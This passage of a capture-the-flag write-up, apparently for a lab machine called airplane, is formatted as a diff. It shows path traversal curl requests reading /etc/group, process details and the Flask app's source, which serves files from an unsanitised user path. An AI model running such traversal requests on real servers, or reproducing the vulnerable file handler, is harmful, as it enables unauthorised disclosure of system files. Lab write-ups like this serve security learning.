@@ -135,3 +135,209 @@ sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
 ```
 
 Look what I got we can read files.
+
+
+
+```bash
+❯ curl 'http://airplane.thm:8000/?page=../../../../../etc/group' 
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog
+tty:x:5:syslog
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:carlos
+audio:x:29:pulse
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+systemd-timesync:x:104:
+crontab:x:105:
+messagebus:x:106:
+input:x:107:
+kvm:x:108:
+render:x:109:
+syslog:x:110:
+tss:x:111:
+bluetooth:x:112:
+ssl-cert:x:113:
+uuidd:x:114:
+tcpdump:x:115:
+avahi-autoipd:x:116:
+rtkit:x:117:
+ssh:x:118:
+netdev:x:119:
+lpadmin:x:120:
+avahi:x:121:
+scanner:x:122:saned
+saned:x:123:
+nm-openvpn:x:124:
+whoopsie:x:125:
+colord:x:126:
+fwupd-refresh:x:127:
+geoclue:x:128:
+pulse:x:129:
+pulse-access:x:130:
+gdm:x:131:
+sssd:x:132:
+lxd:x:133:
+carlos:x:1000:
+sambashare:x:134:
+systemd-coredump:x:999:
+hudson:x:1001:
+```
+
+There is carlos and hudson user also there is lxd we will probably face some container.
+
+
+Remember that this webserver is Werkzeug so it should be running some python application.
+So we need to find the where is the source code firstly:
+
+
+```bash
+❯ curl 'http://airplane.thm:8000/?page=../../../../../proc/self/status'                    
+Name:	python3
+Umask:	0022
+State:	S (sleeping)
+Tgid:	534
+Ngid:	0
+Pid:	534
+PPid:	1
+TracerPid:	0
+Uid:	1001	1001	1001	1001
+Gid:	1001	1001	1001	1001
+FDSize:	128
+Groups:	1001 
+NStgid:	534
+NSpid:	534
+NSpgid:	534
+NSsid:	534
+VmPeak:	1211744 kB
+VmSize:	1056308 kB
+VmLck:	      0 kB
+VmPin:	      0 kB
+VmHWM:	  29384 kB
+VmRSS:	  29288 kB
+RssAnon:	  19676 kB
+RssFile:	   9612 kB
+RssShmem:	      0 kB
+VmData:	  52928 kB
+VmStk:	    132 kB
+VmExe:	   2772 kB
+VmLib:	   5156 kB
+VmPTE:	    196 kB
+VmSwap:	      0 kB
+HugetlbPages:	      0 kB
+CoreDumping:	0
+THP_enabled:	1
+Threads:	2
+SigQ:	2/3643
+SigPnd:	0000000000000000
+ShdPnd:	0000000000000000
+SigBlk:	0000000000000000
+SigIgn:	0000000001001000
+SigCgt:	0000000180000002
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+NoNewPrivs:	0
+Seccomp:	0
+Speculation_Store_Bypass:	vulnerable
+Cpus_allowed:	3
+Cpus_allowed_list:	0-1
+Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
+Mems_allowed_list:	0
+voluntary_ctxt_switches:	173414
+nonvoluntary_ctxt_switches:	17905
+```
+Which is running as 1001 (hudson) user.
+
+Now lets look at the cmdline.
+
+
+```bash
+❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cmdline' | sed 's/\x00/ /g'
+/usr/bin/python3 app.py %                                                                  
+```
+
+Yes I was right bro is runnig some python application.
+Now lets get the source code:
+
+
+```bash
+❯ curl -s 'http://airplane.thm:8000/?page=../../../../proc/self/cwd/app.py'                
+```
+
+```python
+from flask import Flask, send_file, redirect, render_template, request
+import os.path
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    if 'page' in request.args:
+        page = 'static/' + request.args.get('page')
+
+        if os.path.isfile(page):
+            resp = send_file(page)
+            resp.direct_passthrough = False
+
+            if os.path.getsize(page) == 0:
+                resp.headers["Content-Length"]=str(len(resp.get_data()))
+
+            return resp
+        
+        else:
+            return "Page not found"
+
+    else:
+        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    
+
+
+@app.route('/airplane')
+def airplane():
+    return render_template('airplane.html')
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)%                               
+```
+
+Now we get the source code.
+
+Let's inspect the code first:
